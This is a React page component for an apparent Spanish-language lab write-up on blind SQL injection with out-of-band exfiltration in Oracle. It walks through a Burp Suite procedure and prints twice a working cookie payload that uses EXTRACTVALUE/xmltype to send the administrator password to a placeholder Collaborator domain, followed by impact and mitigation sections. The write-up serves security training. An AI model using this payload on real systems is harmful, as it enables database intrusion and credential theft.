import React from 'react';
import { SQLI_LABS } from '@/app/data/sqliLabs';

const Lab17 = () => {
  const lab = SQLI_LABS.find((l) => l.id === 'lab-17');
  if (!lab) return <div>Laboratorio no encontrado</div>;

  return (
    <section className="pt-28 pb-16 bg-black/95 min-h-screen">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
        <h1 className="text-2xl sm:text-3xl font-mono text-[#d4a574] mb-6">
          {lab.title}
        </h1>

        {/* Datos generales */}
        <div className="mb-8 bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-5">
          <h3 className="text-lg font-bold text-[#cc6633] mb-3">Datos generales del laboratorio</h3>
          <ul className="space-y-2 text-sm font-mono text-[#d4a574]/80">
            <li><span className="text-[#cc6633]">Nombre:</span> Blind SQL injection with out-of-band data exfiltration</li>
            <li><span className="text-[#cc6633]">Subtema:</span> Exploiting blind SQL injection using out-of-band (OAST) techniques</li>
            <li><span className="text-[#cc6633]">Nivel:</span> Practitioner</li>
            <li><span className="text-[#cc6633]">Tipo de SQLi:</span> Blind SQL injection (Out-of-band / OAST) con exfiltración de datos</li>
            <li><span className="text-[#cc6633]">Objetivo:</span> Explotar una vulnerabilidad en la cookie TrackingId para extraer la contraseña del usuario administrator mediante una consulta DNS a Burp Collaborator e iniciar sesión con esa credencial.</li>
          </ul>
        </div>

        {/* Explicación técnica */}
        <h3 className="text-lg font-bold text-[#cc6633]">Explicación técnica de la vulnerabilidad</h3>
        <div className="intro text-[#d4a574] mb-6">
          El motor de base de datos Oracle permite concatenar resultados de subconsultas SQL dentro
          de solicitudes de red externas. En este laboratorio, la cookie
          <span className="text-[#cc6633]"> TrackingId</span> se concatena de forma insegura en una
          consulta SQL, lo que permite inyectar una expresión que no solo confirma la vulnerabilidad,
          sino que además exfiltra información sensible fuera de banda.
          <br /><br />
          La técnica consiste en consultar la contraseña del usuario
          <span className="text-[#cc6633]"> administrator</span> desde la tabla
          <span className="text-[#cc6633]"> users</span> y concatenar ese valor como subdominio de una
          petición DNS/HTTP dirigida a un dominio controlado por el atacante, en este caso Burp
          Collaborator.
          <br /><br />
          De esta forma, no es necesario que la aplicación muestre la contraseña en la página ni que
          cambie la respuesta HTTP. Basta con revisar los registros del Collaborator para recuperar la
          información exfiltrada.
        </div>

        {/* Procedimiento */}
        <div className="space-y-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Procedimiento paso a paso</h3>
          {[
            {
              title: 'Paso 1: Captura y preparación',
              items: [
                'Interceptar la petición de la página de inicio en Burp Suite.',
                'Identificar la cookie TrackingId y enviar la solicitud al Repeater.',
              ],
            },
            {
              title: 'Paso 2: Activación de Burp Collaborator',
              items: [
                'Abrir Burp Collaborator Client.',
                'Copiar la dirección pública única asignada por el Collaborator.',
              ],
            },
            {
              title: 'Paso 3: Construcción del payload de exfiltración',
              items: [
                'Usar una función XML de Oracle para forzar una interacción de red externa.',
                'Concatenar dentro del payload el resultado de una subconsulta que recupere la contraseña del usuario administrator.',
              ],
            },
            {
              title: 'Paso 4: Inyección y URL encoding',
              items: [
                'Reemplazar el valor original de la cookie TrackingId con el payload completo.',
                'Aplicar URL encoding al payload, por ejemplo con Ctrl+U en Burp Suite, para que el servidor procese correctamente los caracteres especiales.',
              ],
            },
            {
              title: 'Paso 5: Ejecución del ataque',
              items: [
                'Enviar la petición modificada al servidor.',
                'Observar que la respuesta web puede seguir siendo aparentemente normal, ya que la exfiltración ocurre fuera de banda.',
              ],
            },
            {
              title: 'Paso 6: Recepción de datos',
              items: [
                'Regresar al panel de Burp Collaborator.',
                'Hacer clic en "Poll now" y revisar las entradas DNS/HTTP registradas.',
                'Identificar la contraseña del administrador dentro del subdominio observado.',
              ],
            },
            {
              title: 'Paso 7: Acceso final',
              items: [
                'Copiar la contraseña capturada desde Burp Collaborator.',
                'Dirigirse al apartado "My account" e iniciar sesión como administrator para resolver el laboratorio.',
              ],
            },
          ].map((phase, idx) => (
            <div key={idx}>
              <h4 className="text-md font-bold text-[#d4a574]">{phase.title}</h4>
              <ul className="space-y-2 pl-6 list-decimal">
                {phase.items.map((item, itemIdx) => (
                  <li key={itemIdx} className="text-sm font-mono text-[#d4a574]/75">
                    {item}
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>

        {/* Payload */}
        <div className="mb-6 mt-8">
          <h3 className="text-lg font-bold text-[#cc6633]">Payload utilizado</h3>
          <pre className="bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-4 text-[#d4a574] font-mono overflow-x-auto whitespace-pre-wrap">
{`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`}
          </pre>
          <p className="text-sm font-mono text-[#d4a574]/65 mt-3">
            Sustituye <span className="text-[#cc6633]">BURP-COLLABORATOR-SUBDOMAIN</span> por el dominio único generado por Burp Collaborator.
          </p>
        </div>

        {/* Explicación del payload */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Explicación del payload</h3>
          <div className="intro text-[#d4a574] mb-6">
            El payload utiliza una técnica de exfiltración de datos fuera de banda diseñada para Oracle:
            <br /><br />
            <span className="text-[#cc6633]">
              TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM "http%3a//'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %25remote%3b]&gt;'),'/l')+FROM+dual--
            </span>
            <br /><br />
            <span className="text-[#cc6633]">EXTRACTVALUE / xmltype</span>: funciones de Oracle que procesan XML
            y se aprovechan aquí para forzar una conexión de red externa.
            <br /><br />
            <span className="text-[#cc6633]">Concatenación dinámica (||)</span>: une el resultado de la
            subconsulta de la contraseña con el dominio de Burp Collaborator.
            <br /><br />
            <span className="text-[#cc6633]">Exfiltración vía DNS/HTTP</span>: al intentar resolver la URL
            construida, la base de datos envía involuntariamente la contraseña del administrador hacia el
            dominio controlado por el atacante.
            <br /><br />
            <span className="text-[#cc6633]">FROM dual</span>: completa la sintaxis de la consulta en Oracle.
            <br /><br />
            Esta técnica permite extraer directamente el dato sensible sin depender de la respuesta visible
            de la aplicación, utilizando exclusivamente el canal fuera de banda.
          </div>
        </div>

        {/* Impacto */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Impacto en seguridad</h3>
          <ul className="space-y-2 pl-6 list-disc text-sm font-mono text-[#d4a574]/75">
            <li><span className="text-[#cc6633]">Confidencialidad:</span> permite exfiltrar directamente credenciales hacia infraestructura externa controlada por el atacante.</li>
            <li><span className="text-[#cc6633]">Integridad:</span> demuestra que la consulta SQL original puede manipularse para ejecutar funciones externas y subconsultas arbitrarias.</li>
            <li><span className="text-[#cc6633]">Disponibilidad:</span> las interacciones externas repetidas y el abuso de funciones XML pueden degradar el servicio y facilitar pivoting o exfiltración adicional.</li>
          </ul>
        </div>

        {/* Mitigación */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Mitigación recomendada</h3>
          <div className="intro text-[#d4a574] mb-6">
            La medida principal es el uso de consultas parametrizadas, asegurando que el valor de las
            cookies sea tratado exclusivamente como dato y no como código SQL ejecutable.
            <br /><br />
            Además, se debe reforzar la seguridad de red restringiendo las conexiones salientes desde el
            servidor de base de datos, impidiendo que el motor pueda realizar peticiones DNS o HTTP hacia
            dominios externos no autorizados. También es recomendable deshabilitar funciones de red y de
            procesamiento XML innecesarias en la base de datos para reducir la superficie de ataque.
          </div>
        </div>

        {/* Evidencias */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Evidencias</h3>
          <p className="text-sm font-mono text-[#d4a574]/65 mb-4">
            Coloca aquí las capturas correspondientes al request interceptado, payload utilizado,
            respuesta de la aplicación y confirmación del laboratorio resuelto mediante Burp Collaborator.
          </p>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 1. Request interceptado con la cookie TrackingId.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab17-request.png`}
              alt="Lab 17 request interceptado"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 2. Payload de exfiltración insertado en la cookie.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab17-payload.png`}
              alt="Lab 17 payload"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 3. Respuesta de la aplicación tras enviar la petición.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab17-response.png`}
              alt="Lab 17 respuesta"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div>
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 4. Confirmación de “Lab Solved” y/o registro de exfiltración en Burp Collaborator.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab17-solved.png`}
              alt="Lab 17 laboratorio resuelto"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>
        </div>

        {/* Referencias */}
        <div className="references">
          <h3 className="text-lg font-bold text-[#cc6633]">Referencias</h3>
          <ul className="space-y-2">
            {lab.references.map((r, idx) => (
              <li key={idx} className="text-sm font-mono text-[#d4a574]/75">
                <span className="text-[#cc6633]">› </span>
                <span className="text-[#d4a574]">{r.label}:</span> {r.value}
              </li>
            ))}
          </ul>
        </div>
      </div>
    </section>
  );
};

export default Lab17;